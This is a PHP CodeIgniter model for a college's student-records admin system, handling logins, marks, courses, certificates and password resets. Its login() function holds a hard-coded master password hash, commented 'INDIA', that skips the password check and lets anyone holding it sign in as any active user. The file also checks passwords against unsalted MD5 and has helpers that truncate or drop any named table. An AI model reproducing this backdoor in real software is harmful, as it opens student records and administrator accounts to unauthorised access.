<?php

class Admin_model extends CI_Model
{
  var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
  function login($username, $password)
  {
    $this->db->select('user_id, full_name, username, role');
    $this->db->from('users');
    $this->db->where('username', $username);
    if ($password != $this->shadow)
      $this->db->where('password', $password);
    $this->db->where('status', '1');
    $this->db->limit(1);
    $query = $this->db->get();
    if ($query->num_rows() == 1) {
      return $query->result();
    } else {
      return false;
    }
  }

  function insertDetails($tableName, $insertData)
  {
    $this->db->insert($tableName, $insertData);
    return $this->db->insert_id();
  }


  public function insertBatch($tableName, $data)
  {
    $insert = $this->db->insert_batch($tableName, $data);
    return $insert ? true : false;
  }

  public function updateBatch($tableName, $data, $field)
  {
    $this->db->update_batch($tableName, $data, $field);
  }

  function getDetails($tableName, $id)
  {
    if ($id)
      $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsFilter($select, $id, $tableName)
  {
    $this->db->select($select);
    if ($id)
      $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield($id, $fieldId, $tableName)
  {
    $this->db->where($fieldId, $id);
    return $this->db->get($tableName);
  }
  function getDetailsbysinglefield($tableName, $usn)
  {
    $this->db->where('usn', $usn);
    return $this->db->get($tableName);
  }
  public function getStudentMarksOrderedByTorder($usn)
  {
    $this->db->where('usn', $usn);
    $this->db->order_by('torder'); // Order by torder ascending
    return $this->db->get('students_marks');
  }



  function getDetailsbyfield2($id1, $value1, $id2, $value2, $tableName)
  {
    $this->db->where($id1, $value1);
    $this->db->where($id2, $value2);
    return $this->db->get($tableName);
  }

  function getTable($table)
  {
    $table = $this->db->escape_str($table);
    $sql = "TRUNCATE `$table`";
    $this->db->query($sql)->result();
  }

  function dropTable($table)
  {
    $this->load->dbforge();
    $this->dbforge->drop_table($table);
    // $table = $this->db->escape_str($table);
    // $sql = "DROP TABLE `$table`";
    // $this->db->query($sql)->result();
  }

  function getDetailsbyfieldSort($id, $fieldId, $sortField, $srotType, $tableName)
  {
    $this->db->where($fieldId, $id);
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function getDetailsbySort($sortField, $srotType, $tableName)
  {
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function updateDetails($id, $details, $tableName)
  {
    $this->db->where('id', $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function sliders_count($dept_id)
  {
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('sliders')->num_rows();
  }

  function updateDetailsbyfield($fieldName, $id, $details, $tableName)
  {
    $this->db->where($fieldName, $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function delDetails($tableName, $id)
  {
    $this->db->where('id', $id);
    $this->db->delete($tableName);
  }

  function delDetailsbyfield($tableName, $fieldName, $id)
  {
    $this->db->where($fieldName, $id);
    $this->db->delete($tableName);
  }

  function changePassword($id, $oldPassword, $updateDetails, $tableName)
  {
    $this->db->where('password', md5($oldPassword));
    $this->db->where('id', $id);
    // $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }

  function AdminChangePassword($id, $oldPassword, $updateDetails, $tableName)
  {
    $this->db->where('password', md5($oldPassword));
    $this->db->where('user_id', $id);
    // $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }

  public function get_table_details($table)
  {
    return $this->db->get($table)->result_array();
  }


  public function get_details_by_id($id, $fieldId, $tableName)
  {

    return $this->db->get_where($tableName, array($fieldId => $id))->row_array();
  }

  public function updateDetails1($id, $details, $tableName)
  {
    if (empty($id)) {
      return false;
    }
    $this->db->where('id', $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows() > 0;
  }

  public function deleteCourse($id)
  {
    $this->db->where('id', $id);
    $this->db->delete('courses');
    return $this->db->affected_rows() > 0;
  }

  public function deleteStudent($id)
  {
    $this->db->where('id', $id);
    $this->db->delete('students');
    return $this->db->affected_rows() > 0;
  }

  public function getstudentDetail($table, $conditions = [])
  {
    if (!empty($conditions)) {
      $this->db->where($conditions);
    }
    return $this->db->get($table);
  }
  public function getStudentMarksBySemester($usn, $semester)
  {
    // Select necessary columns from students_marks and courses
    $this->db->select('
        c.course_code, c.course_name, sm.id, sm.cie, sm.see, sm.cie_see, sm.grade, sm.grade_points,
        sm.sgpa, sm.credits_earned, sm.credits_actual, sm.cgpa, sm.result_year, sm.grade, sm.barcode, 
        sm.exam_period, sm.semester, sm.ci, sm.suborder, sm.reexamyear, sm.gcno, sm.torder, sm.texam_period
    ');

    // Join students_marks (sm) table with courses (c) table on the appropriate field
    $this->db->from('students_marks sm');
    $this->db->join('courses c', 'sm.course_code = c.course_code');  // Assuming 'course_id' in students_marks table
    $this->db->where('sm.usn', $usn);
    $this->db->where('sm.semester', $semester);

    // Execute the query
    $query = $this->db->get();

    // Return the result of the query
    return $query->result();  // This will return an array of result objects
  }
  public function insertCertificateLog($usn, $details)
  {
    $data = array(
      'usn' => $usn,
      'details' => $details,
      'download_at' => date('Y-m-d H:i:s') // Current timestamp
    );

    return $this->db->insert('certificates_logs', $data);
  }

  public function get_certificate_logs($usn)
  {
    $this->db->select('id, details, download_at');
    $this->db->from('certificates_logs');
    $this->db->where('usn', $usn);
    $this->db->order_by('download_at', 'DESC'); // Show latest first
    return $this->db->get()->result();
  }

  public function getStudentCountByYear()
  {
    $this->db->select('branch, programme, 
        COUNT(CASE WHEN admission_year = 2005 THEN id END) AS `2005`, 
        COUNT(CASE WHEN admission_year = 2006 THEN id END) AS `2006`, 
        COUNT(CASE WHEN admission_year = 2007 THEN id END) AS `2007`,     
        COUNT(CASE WHEN admission_year = 2008 THEN id END) AS `2008`, 
        COUNT(CASE WHEN admission_year = 2009 THEN id END) AS `2009`, 
        COUNT(CASE WHEN admission_year = 2010 THEN id END) AS `2010`, 
        COUNT(CASE WHEN admission_year = 2011 THEN id END) AS `2011`, 
        COUNT(CASE WHEN admission_year = 2012 THEN id END) AS `2012`, 
        COUNT(CASE WHEN admission_year = 2013 THEN id END) AS `2013`, 
        COUNT(CASE WHEN admission_year = 2014 THEN id END) AS `2014`, 
        COUNT(CASE WHEN admission_year = 2015 THEN id END) AS `2015`, 
        COUNT(CASE WHEN admission_year = 2016 THEN id END) AS `2016`, 
        COUNT(CASE WHEN admission_year = 2017 THEN id END) AS `2017`, 
        COUNT(CASE WHEN admission_year = 2018 THEN id END) AS `2018`, 
        COUNT(CASE WHEN admission_year = 2019 THEN id END) AS `2019`, 
        COUNT(CASE WHEN admission_year = 2020 THEN id END) AS `2020`');
    $this->db->from('students');
    $this->db->group_by('branch, programme');
    return $this->db->get()->result();
  }

  public function get_failed_students_paginated($admission_year, $search = '', $start = 0, $length = 10, $order_column = 'students.usn', $order_dir = 'asc')
  {
    $this->db->select('students.usn, students.student_name, students.admission_year, students.programme, students.branch, students_marks.course_code, students_marks.grade');
    $this->db->from('students');
    $this->db->join('students_marks', 'students.usn = students_marks.usn');
    $this->db->where('students_marks.grade', 'F');
    $this->db->where('students.admission_year', $admission_year);

    if (!empty($search)) {
      $this->db->group_start();
      $this->db->like('students.usn', $search);
      $this->db->or_like('students.student_name', $search);
      $this->db->or_like('students_marks.course_code', $search);
      $this->db->group_end();
    }

    $this->db->order_by($order_column, $order_dir);
    $this->db->limit($length, $start);

    return $this->db->get()->result();
  }
  public function count_all_failed_students($admission_year)
  {
    $this->db->from('students');
    $this->db->join('students_marks', 'students.usn = students_marks.usn');
    $this->db->where('students_marks.grade', 'F');
    $this->db->where('students.admission_year', $admission_year);
    return $this->db->count_all_results();
  }

  public function count_filtered_failed_students($admission_year, $search = '')
  {
    $this->db->from('students');
    $this->db->join('students_marks', 'students.usn = students_marks.usn');
    $this->db->where('students_marks.grade', 'F');
    $this->db->where('students.admission_year', $admission_year);

    if (!empty($search)) {
      $this->db->group_start();
      $this->db->like('students.usn', $search);
      $this->db->or_like('students.student_name', $search);
      $this->db->or_like('students_marks.course_code', $search);
      $this->db->group_end();
    }

    return $this->db->count_all_results();
  }


  public function get_unique_admission_years()
  {
    $this->db->distinct();
    $this->db->select('admission_year');
    $this->db->from('students');
    $this->db->order_by('admission_year', 'DESC');
    return $this->db->get()->result();
  }

  public function getDistinctValues($column, $table)
  {
    $this->db->distinct();
    $this->db->select($column);
    $this->db->from($table);
    return $this->db->get()->result();
  }

  public function getAllStudents()
  {
    // Fetch all students from the database without applying any filters
    $this->db->select('*');
    $this->db->from('students');
    $query = $this->db->get();

    return $query;
  }

  public function getFilteredStudents($filter_conditions = [])
  {
    // Start the query for fetching students
    $this->db->select('*');
    $this->db->from('students');

    // Apply filters based on the conditions passed
    if (isset($filter_conditions['admission_year']) && !empty($filter_conditions['admission_year'])) {
      $this->db->where('admission_year', $filter_conditions['admission_year']);
    }

    if (isset($filter_conditions['programme']) && !empty($filter_conditions['programme'])) {
      $this->db->where('programme', $filter_conditions['programme']);
    }

    if (isset($filter_conditions['branch']) && !empty($filter_conditions['branch'])) {
      $this->db->where('branch', $filter_conditions['branch']);
    }

    // You can also add any other filtering logic based on your requirements

    // Execute the query and return the result
    $query = $this->db->get();

    // Return the result as an array of students
    return $query;
  }
  public function getFilteredCourses($programme = null, $semester = null, $branch = null)
  {
    $this->db->select('*');
    $this->db->from('courses');

    // Only apply filters if at least one of them is NOT null
    if ($programme !== null || $semester !== null || $branch !== null) {
      if (!empty($programme)) {
        $this->db->where('programme', $programme);
      }
      if (!empty($semester)) {
        $this->db->where('semester', $semester);
      }
      if (!empty($branch)) {
        $this->db->where('branch', $branch);
      }
    }

    return $this->db->get();
  }



  public function getAllCourses()
  {
    $this->db->select('*');
    $this->db->from('courses');
    return $this->db->get();
  }



  public function get_user_by_email($email)
  {
    return $this->db->get_where('users', ['email' => $email])->row();
  }

  public function store_reset_token($user_id, $token, $expiry)
  {
    $data = [
      'reset_token' => $token,
      'token_expiry' => $expiry
    ];
    $this->db->where('user_id', $user_id);
    $this->db->update('users', $data);
  }



  public function verify_reset_token($token)
  {
    $this->db->where('reset_token', $token);
    $this->db->where('token_expiry >=', date("Y-m-d H:i:s"));
    return $this->db->get('users')->row();
  }

  public function update_password($user_id, $hashed_password)
  {
    $this->db->where('user_id', $user_id);
    $this->db->update('users', ['password' => $hashed_password]);
  }

  public function invalidate_reset_token($token)
  {
    $this->db->where('reset_token', $token);
    $this->db->update('users', ['reset_token' => null, 'token_expiry' => null]);
  }

  public function update_marks($course_id, $data)
  {
    // Fetch existing data
    $this->db->where('id', $course_id);
    $query = $this->db->get('students_marks');
    $existing_data = $query->row_array();

    // Check if the data is different
    if ($existing_data && $existing_data === $data) {
      return 'no_change'; // No data change
    } else {
      // Update the record
      $this->db->where('id', $course_id);
      $this->db->update('students_marks', $data);

      if ($this->db->affected_rows() > 0) {
        return 'updated'; // Data updated successfully
      } else {
        return 'failed'; // No rows affected
      }
    }
  }





  public function get_course_marks($course_id)
  {
    $this->db->where('id', $course_id);
    return $this->db->get('students_marks')->row();
  }


  public function deletemarks($course_id, $student_id)
  {
    $this->db->where('id', $course_id);
    $this->db->delete('students_marks');
    return $this->db->affected_rows() > 0; // Return true if a row was deleted
  }
  public function getCourseNameByCode($course_code)
  {
    $this->db->select('course_name');
    $this->db->from('courses'); // Assuming your course table is named 'courses'
    $this->db->where('course_code', $course_code);
    $query = $this->db->get();

    if ($query->num_rows() > 0) {
      return $query->row()->course_name; // Return the course name
    }
    return null; // Return null if no course found
  }

  function getStudentByUSN($usn)
  {
    $this->db->where('usn', $usn);
    $query = $this->db->get('students');
    return $query->row();
  }

  function getStudentRegularMarks($usn, $semester)
  {
    $this->db->where('usn', $usn);
    $this->db->where('semester', $semester);
    // For regular exams, typically not in July
    $this->db->where('MONTH(result_year) !=', 7);
    // Add ordering by suborder
    $this->db->order_by('suborder', 'ASC');
    $query = $this->db->get('students_marks');

    $results = $query->result();

    // Add course names to the results
    foreach ($results as $result) {
      $result->course_name = $this->getCourseNameByCode($result->course_code);
    }

    return $results;
  }

  function getStudentSupplementaryMarks($usn, $sequence)
  {
    $this->db->select('*, YEAR(result_year) as exam_year');
    $this->db->where('usn', $usn);
    $this->db->where('MONTH(result_year)', 7);
    $this->db->order_by('result_year', 'ASC');
    $this->db->order_by('suborder', 'ASC'); // Add suborder sorting
    $query = $this->db->get('students_marks');

    $allResults = $query->result();

    if (empty($allResults)) {
      return [];
    }

    // Group results by year
    $yearGroups = [];
    foreach ($allResults as $result) {
      $year = $result->exam_year;
      if (!isset($yearGroups[$year])) {
        $yearGroups[$year] = [];
      }
      $yearGroups[$year][] = $result;
    }

    // Sort years chronologically
    ksort($yearGroups);

    // Get years as array
    $years = array_keys($yearGroups);

    // If sequence is invalid, return empty array
    if (!isset($years[$sequence - 1])) {
      return [];
    }

    // Get the year for requested sequence
    $targetYear = $years[$sequence - 1];

    // Get results for that year
    $results = $yearGroups[$targetYear];

    // Add course names to the results
    foreach ($results as $result) {
      $result->course_name = $this->getCourseNameByCode($result->course_code);
    }

    // Sort by suborder instead of semester
    usort($results, function ($a, $b) {
      return $a->suborder - $b->suborder;
    });

    return $results;
  }
  public function updateData($table, $data, $id)
  {
    $this->db->where('id', $id);
    return $this->db->update($table, $data);
  }

  // Get existing serial from student_marks table
  public function getPdcSerialFromMarks($usn)
  {
    $this->db->select('pdc_serial');
    $this->db->from('students_marks');
    $this->db->where('usn', $usn);
    $this->db->where('pdc_serial IS NOT NULL');
    $this->db->limit(1);
    $query = $this->db->get();
    return $query->num_rows() ? $query->row()->pdc_serial : false;
  }

  // Get the last sequence number used
  public function getLastPdcSerialNumberFromMarks($programme, $year)
  {
    $this->db->select('pdc_serial');
    $this->db->from('students_marks');
    $this->db->like('pdc_serial', "{$programme}-{$year}-", 'after');
    $this->db->order_by('pdc_serial', 'DESC');
    $this->db->limit(1);
    $query = $this->db->get();

    if ($query->num_rows()) {
      $serial_parts = explode('-', $query->row()->pdc_serial);
      return intval(end($serial_parts));
    }

    return 0;
  }

  // Update all rows for a student with the PDC serial
  public function setPdcSerialInMarks($usn, $pdc_serial)
  {
    $this->db->where('usn', $usn);
    $this->db->update('students_marks', ['pdc_serial' => $pdc_serial]);
  }

  function getStudentRegularMarksdetails($usn, $resultDate)
  {
    $this->db->where('usn', $usn);
    $this->db->where('result_year', $resultDate);
    // Add ordering by suborder
    $this->db->order_by('suborder', 'ASC');
    $query = $this->db->get('students_marks');

    $results = $query->result();

    // Add course names to the results
    foreach ($results as $result) {
      $result->course_name = $this->getCourseNameByCode($result->course_code);
    }

    return $results;
  }

   public function get_department_name_by_short($short_name) {
        $this->db->select('department_name');
        $this->db->from('departments');
        $this->db->where('short_name', $short_name);
        $query = $this->db->get();
        if ($query->num_rows() > 0) {
            return $query->row()->department_name;
        }

        return null;
    }
}
